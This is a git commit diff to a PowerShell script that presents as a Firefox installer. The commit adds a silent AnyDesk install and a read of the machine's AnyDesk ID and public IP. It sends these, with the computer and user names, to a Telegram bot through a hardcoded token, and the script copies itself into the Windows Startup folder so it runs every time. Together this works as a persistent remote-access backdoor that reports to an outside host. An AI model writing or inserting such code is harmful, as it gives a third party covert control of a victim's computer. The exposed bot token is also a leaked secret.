ed06349f5de7ddcbe53353d2d2623121eebc4b35
Asadullah Galib <fs6997329@gmail.com>
2025-09-16 10:30:45 +0530

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,21 +1,28 @@
-# Firefox Install
+# Install AnyDesk (Silent Mode)
+choco install anydesk -y
+
+# Install Firefox
 choco install firefox -y
 
 # Telegram Alert Setup
 $BOT_TOKEN = "8469309529:AAH1kdLYjtwee39EAgULMJa64Db_xRnWpYw"
 $CHAT_ID = "1361241039"
 
-# System Info Capture
+# Get AnyDesk ID
+$anydeskId = (Get-ItemProperty "HKLM:\SOFTWARE\AnyDesk\").client_id
+
+# System Info
 $computerName = $env:COMPUTERNAME
 $userName = $env:USERNAME
 $time = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
+$ipAddress = (Invoke-RestMethod -Uri "https://api.ipify.org").ToString()
 
-# Send Telegram Alert
-$message = "🚨 Laptop Accessed!`n`n💻 Computer: $computerName`n👤 User: $userName`n⏰ Time: $time"
+# Send Telegram Alert with AnyDesk ID
+$message = "🚨 Laptop Accessed!`n`n💻 Computer: $computerName`n👤 User: $userName`n🌐 IP: $ipAddress`n⏰ Time: $time`n🔗 AnyDesk ID: $anydeskId`n`n📌 Connect: https://anydesk.com"
 Invoke-WebRequest -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$message" -UseBasicParsing
 
 # Create Log File
-"$time - $computerName - $userName" | Out-File -FilePath "$env:USERPROFILE\access_log.txt" -Append
+"$time - $computerName - $userName - $ipAddress - AnyDesk: $anydeskId" | Out-File -FilePath "$env:USERPROFILE\access_log.txt" -Append
 
 # Add to Startup
 Copy-Item "$PSCommandPath" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\script.ps1"
